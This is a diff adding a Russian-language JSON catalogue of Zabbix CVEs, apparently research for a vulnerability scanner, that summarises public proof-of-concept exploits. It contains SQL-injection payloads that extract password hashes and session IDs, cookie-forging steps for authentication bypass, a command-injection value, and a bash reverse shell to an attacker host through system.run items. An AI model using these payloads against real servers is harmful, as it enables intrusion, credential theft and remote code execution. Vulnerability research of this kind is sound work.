@@ -1,0 +1,247 @@
+[
+  {
+    "cve": "CVE-2016-10134",
+    "pocs": [
+      {
+        "url": "https://www.exploit-db.com/exploits/40353",
+        "steps": "SQL-инъекция в jsrpc.php (profileIdx2), error-based 'Duplicate entry'. GET /jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=<SQL>&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1. SQL: (select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT N,1),floor(rand(0)*2))x from information_schema.tables group by x)a) — вытащить alias~passwd; затем из zabbix.sessions где status=0 and userid=N — sessionid (полезно для последующего входа как Admin).",
+        "conditions": "Zabbix 2.0.x-3.0.3 (фикс 3.0.4). Без аутентификации (sid хардкодится произвольным, стек не проверяется).",
+        "language": "python2 (urllib2)"
+      },
+      {
+        "url": "https://www.exploit-db.com/exploits/40237",
+        "steps": "Инъекция в toggle_ids на latest.php, stacked query: GET (или POST) latest.php?output=ajax&sid=<sid>&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385);select * from users where (1=1 — профиль вставляется в INSERT INTO profiles ...'); <SQL> через CProfile::insertDB()/DBexecute() (frontends/php/include/profiles.inc.php:185). Автор (1n3) показывает, что для эксплуатации достаточно аутентифицированного пользователя или guest-режима.",
+        "conditions": "Zabbix 2.2.x, 3.0.x (фикс 3.0.4). Требуется сессия (User/guest); при включённом guest-режиме — без пароля.",
+        "language": "curl/HTTP (текстовый PoC)"
+      },
+      {
+        "url": "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/zabbix_toggleids_sqli.rb",
+        "steps": "MSF auxiliary/gather/zabbix_toggleids_sqli (CVE-2016-10134, автор bperry): 1) GET /index.php → извлечь sid (name=\"sid\" value=...) и куки; 2) POST latest.php?output=ajax&sid=<sid> с vars: favobj=toggle, toggle_ids[]='348 <SQL>', toggle_open_state=0; 3) error-based экфильтрация через COUNT(*)+GROUP BY dup-entry: AND (SELECT 5361 FROM(SELECT COUNT(*),CONCAT(marker,(SELECT ...),marker,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) — перечисляет БД и таблицу users (alias, passwd) во всех схемах, сохраняет в loot JSON.",
+        "conditions": "Zabbix 3.0.3 и ранее (фикс 3.0.4). REQUIREAUTH=false по умолчанию (можно без аутентификации); иначе логин Admin/zabbix.",
+        "language": "ruby (Metasploit)"
+      },
+      {
+        "url": "https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134",
+        "steps": "Vulhub-стенд 3.0.3: 1) без аутентификации: /jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0) — error-based updatexml; 2) вариант через latest.php (guest): /latest.php?output=ajax&sid=<последние 16 симв. куки zbx_sessionid от гостевой сессии>&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0). Дальше стандартная цепочка к RCE: SQLi -> sessionid Admin -> вход -> выполнение скриптов (см. exploit-db 39937 'Zabbix API JSON-RPC RCE').",
+        "conditions": "Zabbix 3.0.3 docker (Ubuntu+MySQL). jsrpc.php — без аутентификации; latest.php — guest-режим.",
+        "language": "python3 + curl"
+      },
+      {
+        "url": "https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html",
+        "steps": "Полная цепочка SQLi->RCE (2016): 1) error-based SQLi (jsrpc.php profileIdx2) добывает sessionid администратора из zabbix.sessions; 2) вход с этим sessionid; 3) через фронтенд/API создаётся item/script с командой и запускается (аналог техники MSF zabbix_script_exec), давая выполнение команд на Zabbix Server/хостах.",
+        "conditions": "Zabbix 2.2.x-3.0.3; требуется активная сессия admin в sessions или слабый пароль Admin.",
+        "language": "текстовый разбор (packetstorm)"
+      }
+    ],
+    "research_notes": "Главная публичная инъекция 2016 года: два вектора — jsrpc.php?profileIdx2 (без аутентификации) и latest.php?toggle_ids[] (guest/аутентифицированный, stacked query в INSERT INTO profiles). Подтверждена проверка модуля MSF. В NVD вариант 'before 2.2.14 and 3.0 before 3.0.4'."
+  },
+  {
+    "cve": "CVE-2016-10135",
+    "pocs": [],
+    "research_notes": "ВАЖНО: по NVD (https://nvd.nist.gov/vuln/detail/CVE-2016-10135) CVE-2016-10135 — это НЕ Zabbix: это уязвимость LG MTKLogger (Android, MTK-чипсеты, com.mediatek.mtklogger — экспортируемые компоненты), CNA cve@mitre.org. Zabbix-инъекция в jsrpc.php/latest.php носит ТОЛЬКО CVE-2016-10134 (подтверждено disclosure 1n3 https://seclists.org/fulldisclosure/2016/Aug/60, где указан фикс 3.0.4 и только один CVE). Видимо, в таск-листе присутствует ошибочная атрибуция из устаревших списков, где 10134/10135 шли парой. Публичных PoC 'для Zabbix CVE-2016-10135' не существует. Для сканера: маппить 10134, 10135 игнорировать или пометить как non-Zabbix."
+  },
+  {
+    "cve": "CVE-2017-2824",
+    "pocs": [
+      {
+        "url": "https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2017-2824",
+        "steps": "RCE в trapper'е Zabbix Server через регистрацию поддельного агента (auto-registration). 1) Предусловие: на сервере включено действие Auto-registration ('Add host') в Configuration->Actions. 2) Шаг 1: TCP-соединение на порт 10051, отправить JSON {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\";touch /tmp/success\"} — поле ip невалидируется и сохраняется как адрес интерфейса хоста. 3) Шаг 2: перебор hostid (в PoC 10000..10500), отправлять {\"request\":\"command\",\"scriptid\":1,\"hostid\":\"<id>\"}; когда hostid совпадает, сервер выполняет remote command для хоста, подставляя сохранённый ip в shell-команду (system()/popen), и \";touch /tmp/success\" выполняется НА САМОМ СЕРВЕРЕ от пользователя zabbix. Успех: в ответе нет 'failed' и создаётся /tmp/success.",
+        "conditions": "Zabbix Server 2.0.x<2.0.21, 2.2.x<2.2.18, 2.4.x (2.4.0-2.4.9+rc), 3.0.x<3.0.9, 3.2.x<3.2.5 (Talos TALOS-2017-0325). Порт 10051 доступен; включён auto-registration; права исполнения remote command у сервера.",
+        "language": "python3 (socket, json)"
+      },
+      {
+        "url": "https://talosintelligence.com/reports/TALOS-2017-0325",
+        "steps": "Talos-отчёт: command injection в 'trapper command functionality'. Атакующий из 'active proxy' шлёт crafted пакеты на порт 10051: регистрация хоста с инъекцией в поле адреса, затем запрос 'command' для триггера выполнения. В отчёте описаны все затронутые ветки и фиксы (2.4.x — 2.4.9+, 3.0.x — 3.0.9, 3.2.x — 3.2.5).",
+        "conditions": "То же, что выше; детали протокола zbx (ZBXD\\x01 + длина) в документации Zabbix.",
+        "language": "текстовый advisory (без кода)"
+      }
+    ],
+    "research_notes": "Механика: сервер, исполняя remote command для хоста, подставляет сохранённый в БД адрес интерфейса хоста в команду (например, zabbix_get -s <ip> ...), поэтому ip вида ';cmd' даёт инъекцию. CVE-2017-2825 (соседний, DoS trapper) в таск-листе не требуется, но упоминается в том же отчёте Talos. В Metasploit модуля нет."
+  },
+  {
+    "cve": "CVE-2019-17382",
+    "pocs": [
+      {
+        "url": "https://www.exploit-db.com/exploits/47467",
+        "steps": "Обход логина (CWE-862/306): GET /zabbix.php?action=dashboard.view&dashboardid=1 без каких-либо куки/учётки -> HTTP 200 и содержимое дашборда (устанавливаются zbx_sessionid и PHPSESSID). Аноним затем может создавать Dashboard/Report/Screen/Map; созданные элементы видны другим пользователям и админу.",
+        "conditions": "Zabbix 2.x-4.2 (по заявлению автора), 'through 4.4' по NVD; фикс 4.4.1 (Snyk range [,4.4.1)). Никакой аутентификации не требуется.",
+        "language": "curl/HTTP (текстовый PoC)"
+      },
+      {
+        "url": "https://www.exploit-db.com/exploits/47474",
+        "steps": "Perl-скрипт (Todor Donev): GET <host>/zabbix/zabbix.php?action=dashboard.view&dashboardid=1 c LWP::UserAgent; если в ответе есть 'Dashboard' — уязвим; выводит список доступных action-страниц (dashboard.view, problem.view, overview.php, latest.php, charts.php, screens.php, map.view и т.д.).",
+        "conditions": "Zabbix <= 4.4; без аутентификации.",
+        "language": "perl (LWP)"
+      }
+    ],
+    "research_notes": "ZBX-16789. По NVD 'Zabbix through 4.4'; фикс в 4.4.1 (Snyk SNYK-UNMANAGED-ZABBIXZABBIX-2364940, range [,4.4.1)); в старых LTS-ветках закрыт бэкпортами (Debian-патч 2023). Влияние: anonymous-доступ к дашборду, создание элементов и XSS-подобные сценарии на их основе."
+  },
+  {
+    "cve": "CVE-2022-23131",
+    "pocs": [
+      {
+        "url": "https://github.com/Mr-xn/cve-2022-23131/blob/main/zabbix_session_exp.py",
+        "steps": "SAML SSO authentication bypass (источник SonarSource; PoC от @random-robbie/@jweny/@Mr-xn): 1) GET / (или /index.php) без аутентификации — сервер выдаёт куку zbx_session (base64url). 2) base64-decode -> JSON вида {\"sessionid\":\"<32hex>\",\"sign\":\"<hex>\"} (в 5.0/5.4) или {\"sessionid\",\"serverCheckResult\",\"serverCheckTime\",\"sign\"} (6.0.0beta). 3) В JSON добавить \"saml_data\":{\"username_attribute\":\"Admin\"} (искомое имя пользователя — известное заранее), НЕ трогая sessionid и sign. 4) base64-encode, установить как zbx_session. 5) GET /index_sso.php с этой кукой — index_sso.php видит saml_data и вызывает user.loginByUsername('Admin') -> редирект на dashboard под Admin. КЛЮЧЕВОЕ: подпись НЕ вычисляется и НЕ проверяется — checkSign() (CEncryptedCookieSession::checkSign, в 5.4 на базе CEncryptHelper::sign/AES-ECB) вызывается только при извлечении sessionid, а в index_sso.php не вызывается вообще; sign берётся из собственной анонимной куки как есть (CWE-565).",
+        "conditions": "SAML SSO включён (не по умолчанию); знать имя Zabbix-пользователя (по умолчанию 'Admin'; или guest, если включён). Уязвимые: 4.0.0-4.0.36, 5.0.0-5.0.18, 5.4.0-5.4.8, 6.0.0beta1; фикс 4.0.37, 5.0.19, 5.4.9, 6.0.0beta2 (коммит 0395828a — подпись SAML-атрибутов, eea1f70a — переход на HMAC).",
+        "language": "python3 (requests, base64)"
+      },
+      {
+        "url": "https://github.com/kh4sh3i/CVE-2022-23131",
+        "steps": "Nuclei-шаблон (zabbix-saml-bypass.yaml): тот же принцип — декодировать zbx_session, добавить saml_data.username_attribute, перекодировать, GET index_sso.php; детект по вхождению в ответ 'action=dashboard'.",
+        "conditions": "SAML SSO включён; фикс-версии выше.",
+        "language": "yaml (nuclei)"
+      },
+      {
+        "url": "https://www.sonarsource.com/blog/zabbix-case-study-of-unsafe-session-storage/",
+        "steps": "Глубокий разбор: client-side session (CCookieSession/CEncryptedCookieSession, session_set_save_handler), read() грузит все поля куки в $_SESSION; checkSign() вызывается только в extractSessionId(); index_sso.php: if (CSessionHelper::has('saml_data')) { loginByUsername($saml_data['username_attribute'], ...) } — поле полностью клиентское. Также описан патч (добавление подписи SAML-атрибутов + HMAC вместо AES-ECB) и видео-демо.",
+        "conditions": "—",
+        "language": "текстовый разбор (PHP-код)"
+      }
+    ],
+    "research_notes": "CISA KEV (active exploitation с 2022 г.). Цепочка после байпаса: admin-доступ -> script/API RCE (см. CVE-2021-46088, EDB 50816, MSF zabbix_script_exec). Формат куки версионно-зависим: в 5.0/5.4 JSON {\"sessionid\",\"sign\"}; в 6.0 beta добавлены serverCheckResult/serverCheckTime; в новых версиях подпись — HMAC-SHA256(key=session_key из DB config, data=JSON sorted compact) и sign лежит внутри base64(JSON); формат 'base64(payload).hexsig' с точке относится к другим веткам — сверять с кодом фронтенда."
+  },
+  {
+    "cve": "CVE-2022-23134",
+    "pocs": [
+      {
+        "url": "https://github.com/TheN00bBuilder/cve-2022-23134-poc-and-writeup",
+        "steps": "Reconfigure установленного Zabbix через setup.php (step 6) без аутентификации. 1) Сформировать куку zbx_session = base64url({\"step\":\"6\",\"default_timezone\":\"system\",\"DB_TYPE\":\"MYSQL\",\"DB_SERVER\":\"<ip атакующего>\",\"DB_PORT\":3306,\"DB_DATABASE\":\"zabbix\",\"DB_USER\":\"zabbix\",\"DB_PASSWORD\":\"<pass>\"}). 2) POST /zabbix/setup.php с data sid=<16 hex>, form_refresh=1, next[5]=Next step и этой кукой. 3) CSetupWizard::stage6() создаёт conf/zabbix.conf.php из значений сессии (getConfig() читает $_SESSION, подпись не проверяется — checkSign() не вызывается) и пишет конфиг на сервере, указывая на БД атакующего. 4) Предусловие: MySQL атакующего с полной схемой zabbix и пользователем zabbix (в MySQL 8 обязательно mysql_native_password: ALTER USER ... IDENTIFIED WITH mysql_native_password BY ...). 5) После перезаписи конфига фронтенд ходит в БД атакующего; логин с известными учётками -> полный доступ.",
+        "conditions": "Zabbix Frontend 5.4.0-5.4.8rc1, 6.0.0alpha1-beta1 (NIST; некоторые источники добавляют 5.0.x/4.0.x — в NVD cpe точный диапазон не задан); фикс 5.4.9/6.0.0beta2 (коммит 20943ae3 — ранний выход, если инстанс уже установлен и юзер не Super Admin). Требуется БД атакующего.",
+        "language": "python3 (requests), MySQL"
+      },
+      {
+        "url": "https://www.sonarsource.com/blog/zabbix-case-study-of-unsafe-session-storage/",
+        "steps": "Механика: setup.php использует сессию для хранения прогресса шагов (CSetupWizard), подпись куки нигде не проверяется на этом пути; атакующий кладёт step=6 + DB-параметры прямо в куку; stage6() собирает CConfigFile из getConfig() (обёртка над $_SESSION) и сохраняет zabbix.conf.php. Дополнительно отмечены векторы развития: LOAD DATA LOCAL (отключён в новых PHP), phar:// через file_exists() при валидации БД; доступ не даёт управления агентами, т.к. сервер и фронтенд должны смотреть в одну БД.",
+        "conditions": "—",
+        "language": "текстовый разбор (PHP-код)"
+      }
+    ],
+    "research_notes": "CISA KEV. Реальный эксплуатационный сценарий 2022 г.: CVE-2022-23134 для перехода в setup-визард + CVE-2022-23131/сильные админ-сценарии. NVD severity moderate, но в эксплуатации = полный перехват конфигурации фронтенда."
+  },
+  {
+    "cve": "CVE-2023-32725",
+    "pocs": [],
+    "research_notes": "Механика (ZBX-23854, CWE-565, CVSS 9.6 по Zabbix / 8.8 NVD): URL-widget на дашборде грузит произвольный URL (задаётся любым Zabbix-пользователем); при тестировании или исполнении scheduled reports (доступны только Admin/Super admin) сервер/веб-сервис отдаёт на этот URL куку zbx_session того пользователя, который создал отчёт. Владелец сайта-приёмника получает куку и может притворяться этим пользователем (session hijack -> privilege escalation). Затронуто: 6.0.0-6.0.21 (фикс 6.0.22, коммит 89e0cd6ea93), 6.4.0-6.4.6 (фикс 6.4.7, коммит 3f22d7dd372), 7.0.0alpha1-alpha3 (фикс alpha4/alpha5, коммит 4428a58a30f). Публичного PoC-кода не найдено (атака тривиальна — достаточно контролируемого веб-сервера и URL-widget). Рационален фингерпринт по версии и ручная проверка."
+  },
+  {
+    "cve": "CVE-2024-22117",
+    "pocs": [],
+    "research_notes": "Механика (NVD, Zabbix advisory 2024): URL, добавленный к элементу карты (sysmapelementurlid), хранится с последовательными ID; манипуляция sysmapelementurlid+1 пользователем блокирует добавление URL другими (фактически DoS/спуфинг последовательности, 'Improper Access Control'). Не RCE. Публичных PoC нет. Для сканера: низкий приоритет, condition-check только."
+  },
+  {
+    "cve": "CVE-2024-22119",
+    "pocs": [],
+    "research_notes": "Механика (NVD): невалидация поля 'Name' на странице Graph в Items — хранимый XSS (improper input validation). Публичных PoC в exploit-db/metasploit/github-поиске не найдено. Проверять вручную: ввод <img/script> в Name графика и просмотр страницы."
+  },
+  {
+    "cve": "CVE-2024-22120",
+    "pocs": [
+      {
+        "url": "https://github.com/W01fh4cker/CVE-2024-22120-RCE",
+        "steps": "Полный тулкит (3 скрипта). Предусловие: low-privilege пользователь с правом исполнения хотя бы одного script'а (check: меню на странице Hosts). 1) Захватить sessionid: войти (guest/пользователь), декодировать куку zbx_session (base64 JSON {\"sessionid\",\"serverCheckResult\",\"serverCheckTime\",\"sign\"}) и взять sessionid; взять hostid (Monitoring->Hosts) и scriptid (разрешённый). 2) Time-based blind SQLi: на TCP/10051 слать фрейм ZBXD\\x01 + 8 байт длины LE + JSON {\"request\":\"command\",\"sid\":<sessionid>,\"scriptid\":\"2\",\"hostid\":\"10084\",\"clientip\":\"' + (SQL) + '\"} — clientip попадает в аудит-запись без санитизации. SQL: (select CASE WHEN ascii(substr((select session_key from config),POS,1))=ORD THEN sleep(10) ELSE sleep(1) END) — последовательно вытащить 32-hex session_key; затем (select sessionid from sessions where userid=1 limit 1) — admin sessionid. 3) Скрипт CVE-2024-22120-LoginAsAdmin.py/встроенный forge: сформировать куку zbx_session из JSON {\"sessionid\":<admin sid>,\"serverCheckResult\":true,\"serverCheckTime\":<ts>,\"sign\":HMAC-SHA256(key=session_key, data=JSON(sorted,compact))}, base64 -> GET /zabbix.php?action=dashboard.view. 4) RCE (CVE-2024-22120-RCE.py): по api_jsonrpc.php script.create ({\"command\":\"<cmd>\",\"name\":\"x\",\"type\":0,\"scope\":2}) -> script.execute({\"scriptid\":..,\"hostid\":..}) — глобальный скрипт выполняется на Zabbix Server от пользователя zabbix; затем script.update/script.delete. Альтернатива Webshell.py — чаще не проходит (права файловой системы zabbix).",
+        "conditions": "Zabbix 6.0.0-6.0.27 (фикс 6.0.28rc1), 6.4.0-6.4.12 (фикс 6.4.13rc1), 7.0.0alpha1-beta1 (фикс 7.0.0beta2). Нужны: порт 10051 доступен, low-priv учётка с правом на script (или guest, если ему разрешён скрипт), hostid+scriptid. Zabbix заявлял high privileges, NVD — low (проверять права роли/хоста).",
+        "language": "python3 (pwntools, requests)"
+      },
+      {
+        "url": "https://0xdf.gitlab.io/2025/10/09/htb-watcher.html",
+        "steps": "Практическое повторение цепочки (HTB Watcher, Zabbix 6.4.12): гостевая сессия -> sessionid из куки; scriptid реально разрешённый (в лабе 1 или 2, а не 3); скрипт zabbix_server_time_based_blind_sqli.py (pwntools) вытаскивает session_key из config и admin sessionid; forge куки; далее CVE-2024-22120-RCE.py даёт интерактивный shell (uid=zabbix). Подтверждено, что время подбора ~десятки минут (sleep 1/10).",
+        "conditions": "Лабораторная среда; все шаги соответствуют ZBX-24505.",
+        "language": "python3"
+      }
+    ],
+    "research_notes": "ZBX-24505. Суть: команда script.execute фиксируется в Audit Log с полем clientip (IP подключившегося), которое не экранируется при INSERT — time-based blind SQLi. Важная деталь: атака идёт по протоколу trapper'а (10051), а не через веб. Guest-пользователь обычно не имеет прав на скрипты — нужен реальный low-priv аккаунт. Один из двух (с CVE-2024-42327) главных 'Zabbix 7.0.x RCE' векторов 2024-2025."
+  },
+  {
+    "cve": "CVE-2024-22121",
+    "pocs": [],
+    "research_notes": "Механика (NVD): non-admin пользователь может менять/удалять важные функции конфигурации Zabbix Agent (integrity/availability impact). Подробных публичных PoC нет (probable: права на agent-конфиг через API/фронтенд без проверки роли). Для сканера: condition-based, проверять вручную."
+  },
+  {
+    "cve": "CVE-2024-22122",
+    "pocs": [],
+    "research_notes": "Механика (ZBX-25012, NVD): AT-командная инъекция на Zabbix Server в SMS-медиа: поле 'Number' не валидируется ни на веб, ни на сервере; при тесте SMS (или реальной отправке) специально сформированный номер позволяет выполнить дополнительные AT-команды на GSM-модеме. Требует конфигурации SMS-медиа (админ) и физического модема. Публичных PoC в открытых источниках не найдено."
+  },
+  {
+    "cve": "CVE-2024-22123",
+    "pocs": [],
+    "research_notes": "Механика (NVD): при настройке SMS-медиа можно указать произвольный файл как 'GSM modem device'; т.к. в Linux 'всё — файл', можно указать, например, лог-файл: zabbix_server начнёт общаться с ним как с модемом — лог будет испорчен AT-командами, а небольшая часть содержимого файла утечёт в UI. Arbitrary-file-read-ish. Публичных PoC нет."
+  },
+  {
+    "cve": "CVE-2024-22116",
+    "pocs": [],
+    "research_notes": "RCE (ZBX-25016, 'Remote code execution within ping script', critical): администратор с ограниченными правами может эксплуатировать выполнение скриптов в Monitoring->Hosts; отсутствие экранирования параметров скрипта по умолчанию позволяет вставить произвольную команду через параметр (напр., в стандартный Ping-скрипт) и выполнить код на целевом хосте/сервере. Затронуто: 6.4.9-6.4.15 (фикс 6.4.16rc1), 7.0.0alpha1-rc3 (фикс 7.0.0rc3/7.0.0), 6.0.x также частично (проверять). Публичного standalone-PoC кода не найдено (эксплуатация = правка параметров скрипта в UI/API). Это один из 'Zabbix 7.0.x RCE' векторов."
+  },
+  {
+    "cve": "CVE-2024-42327",
+    "pocs": [
+      {
+        "url": "https://www.exploit-db.com/exploits/52230",
+        "steps": "Проверочный PoC (m4nb4): 1) POST /api_jsonrpc.php user.login ({\"username\",\"password\"}) -> auth_token; 2) POST user.get с params {\"selectRole\":[\"roleid\",\"name\",\"type\",\"readonly AND (SELECT(SLEEP(5)))\"],\"userids\":[\"1\",\"2\"]} — если ответ без 'error' (спит 5с) — уязвим. SQLi в CUser::addRelatedObjects (selectRole).",
+        "conditions": "Zabbix 6.0.0-6.0.31 (фикс 6.0.32rc1), 6.4.0-6.4.16 (фикс 6.4.17rc1), 7.0.0-7.0.0 (фикс 7.0.1rc1). Нужен аккаунт с API-доступом (роль User по умолчанию подходит), НЕ admin.",
+        "language": "python3 (requests)"
+      },
+      {
+        "url": "https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE",
+        "steps": "Полная SQLi->RCE: 1) user.login -> auth_token; 2) time-based SQLi через user.get selectRole: (IF(ORD(MID((SELECT sessionid FROM zabbix.sessions WHERE userid=1 LIMIT 1),POS,1))=ORD THEN SLEEP(5) ...) — мультитредово вытащить admin sessionid; 3) с admin session: host.get/selectInterfaces -> hostid+interfaceid; 4) item.create {\"key_\":\"system.run[bash -c \\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\"]\",\"type\":0,...,\"interfaceid\":..} -> reverse shell на агенте/хосте (требует AllowKey=system.run[*], в 5.0/6.0 по умолчанию серверу разрешён на агентах).",
+        "conditions": "Версии выше; аккаунт с API-доступом; для RCE-части — доступный host+интерфейс и AllowKey=system.run[*] на агенте (7.0: EnableGlobalScripts/scope влияют только на server-side скрипты, item-техника — на агента).",
+        "language": "python3 (requests, threading)"
+      },
+      {
+        "url": "https://github.com/godylockz/CVE-2024-42327",
+        "steps": "Аналогичный PoC privilege escalation -> RCE: вход как non-admin API-пользователь, time-based SQLi в user.get ищет admin session; с admin-токеном создаёт item 'rce' (system.run) на первом хосте из host.get и ждёт перехвата shell (nc). Параметры: --threads, --sleep-time, --row, --length.",
+        "conditions": "То же; Zabbix fixed 6.0.32rc1/6.4.17rc1/7.0.1rc1.",
+        "language": "python3 (netifaces, requests)"
+      }
+    ],
+    "research_notes": "ZBX-25623. CUser.get доступен любому юзеру с API-доступом; addRelatedObjects формирует запрос с selectRole (и др. select-полями) без экранирования -> SQLi (известна и community-версия через selectHosts и пр.). База: извлечение admin sessionid из zabbix.sessions -> привилегии. CVSS 9.9 (Zabbix). Один из главных векторов 'Zabbix 7.0.x RCE'. Watchdog1337/CVE-2024-42327_Zabbix_SQLI — ещё один PoC того же типа."
+  },
+  {
+    "cve": "CVE-2025-27232",
+    "pocs": [],
+    "research_notes": "Механика (ZBX-27282, HackerOne o4ncL1): аутентифицированный Super Admin шлёт crafted HTTP-запросы к действию oauth.authorize фронтенда -> произвольное чтение файлов веб-сервера (LFI, confidentiality loss). CVSS 6.8. Затронуто ТОЛЬКО 7.4.0-7.4.2 (новая функциональность 7.4), фикс 7.4.3. Публичных PoC нет (данные ограничены и неполны; детальная механика в открытом доступе не раскрыта — только параметр action=oauth.authorize)."
+  },
+  {
+    "cve": "CVE-2025-27233",
+    "pocs": [],
+    "research_notes": "Механика (ZBX-26987, HackerOne kelsier, Snyk SNYK-GOLANG-GITHUBCOMZABBIXZABBIXSRCGOPLUGINSSMART-13102983, credit Janis Nulle): плагин smartctl в Zabbix Agent 2 (src/go/plugins/smart) не санитизирует параметры smart.disk.get -> инъекция произвольных аргументов в исполняемый smartctl. На Windows-хостах можно заставить smartctl обратиться к SMB/UNC-пути атакующего и украсть NTLMv2-хеш. Затронуто: 6.0.0-6.0.39 (фикс 6.0.40), 7.0.0-7.0.10 (фикс 7.0.11), 7.2.0-7.2.4 (фикс 7.2.5). Workaround: AllowKey/DenyKey строгая валидация или удалить smartctl. Публичного PoC-кода нет; атака = запрос к агенту 2 метрики smart.disk.get с подделанными параметрами."
+  },
+  {
+    "cve": "CVE-2025-27234",
+    "pocs": [],
+    "research_notes": "Механика (ZBX-26985): та же несанитизированная smart.disk.get, но в Zabbix 5.0 (Agent 2 5.0.x) инъекция аргументов даёт remote code execution (CVSS 7.3). Затронуто: 5.0.0-5.0.46, фикс 5.0.47. Публичного PoC-кода не найдено; детали RCE-инъекции в открытых источниках не раскрыты (только 'unexpected arguments into smartctl command')."
+  },
+  {
+    "cve": "CVE-2025-27240",
+    "pocs": [],
+    "research_notes": "Механика (ZBX-26986): secondary-order SQL-инъекция на Zabbix Server: администратор записывает в поле 'Visible name' хоста (или авторегистрируемого) злонамеренный SQL; при автоматическом удалении (autoremoval) авто-зарегистрированных хостов значение попадает в SQL-запрос без экранирования. Требует прав администратора (или влияния на авто-регистрацию). Публичных PoC нет."
+  },
+  {
+    "cve": "CVE-2021-46088",
+    "pocs": [],
+    "research_notes": "RCE (NVD): Zabbix 4.0 LTS/4.2/4.4/5.0 LTS — любой пользователь с ролью 'Zabbix Admin' может выполнить произвольный shell-скрипт на app-сервере от имени пользователя приложения (это 'script execution' функциональность; в связке с CVE-2022-23131 даёт RCE после байпаса SSO). Отдельного dedicated-PoC нет — используется общая техника script/item (см. MSF zabbix_script_exec, EDB 50816, EDB 39937)."
+  },
+  {
+    "cve": "CVE-2013-3628",
+    "pocs": [
+      {
+        "url": "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/zabbix_script_exec.rb",
+        "steps": "MSF zabbix_script_exec (authenticated RCE, полезен после 23131/дефолтных учёток; проверен на 2.0.5-6.0.0): 1) apiinfo.version; 2) user.login (Admin/zabbix) -> auth_token; 3) TECHNIQUE=script: script.create ({\"command\":payload,\"name\":rand,\"type\":0}, >=5.4 ещё \"scope\":2) -> hostgroup.get -> host.create (host с интерфейсом 127.0.0.1:10050, TLS_PSK если задан) -> script.execute ({\"scriptid\",\"hostid\"}) — выполнение глобального скрипта на Zabbix Server; TECHNIQUE=item (>=3.0, нужно AllowKey=system.run[*]): host.create + item.create {\"key_\":\"system.run[<payload>,nowait]\",\"type\":0,...} и ожидание опроса агентом. Работает вплоть до Zabbix 6.0.0.",
+        "conditions": "Аутентифицированный доступ (дефолт Admin/zabbix на свежих установках); роль с правом script/create; для item-техники — AllowKey=system.run[*] на агенте.",
+        "language": "ruby (Metasploit)"
+      }
+    ],
+    "research_notes": "Классическая authenticated-RCE техника 'create script + host 127.0.0.1 + execute' — универсальный post-auth шаг для сканера (работает и на 5.0.17 — см. EDB 50816, и используется во всех цепочках после SQLi/SSO-байпаса)."
+  },
+  {
+    "cve": "non-CVE: Zabbix-5.0.17-authenticated-RCE",
+    "pocs": [
+      {
+        "url": "https://www.exploit-db.com/exploits/50816",
+        "steps": "Authenticated RCE на 5.0.17 (Hussien Misbah, GitHub HussienMisbah/tools): 1) POST /index.php {\"request\":\"hosts.php\",\"name\",\"password\",\"autologin\":1,\"enter\":\"Sign in\"} — проверка 'Zabbix 5.0.17' и 'Sign out'; 2) из страницы взять hostid (filter_hostids%5B0%5D) и csrf-токен (meta name=csrf-token); 3) POST /items.php form=create с key=system.run[<reverse shell>,nowait], name/type=0 и пр. полями формы; 4) найти itemid в списке /items.php?page=N; 5) POST /items.php form=update + check_now='Execute now' -> через ~1 мин агент выполняет команду. Blind RCE.",
+        "conditions": "Zabbix 5.0.17 (тест автора), admin-учётка, агент с AllowKey=system.run[*] (по умолчанию в 5.0); listener у атакующего.",
+        "language": "python3 (requests)"
+      }
+    ],
+    "research_notes": "Без привязанного CVE (admin-by-design script execution); включён как надёжный референс post-auth RCE для сканера в активном режиме. Та же техника system.run+check_now покрывает CVE-2021-46088-подобные сценарии."
+  }
+]
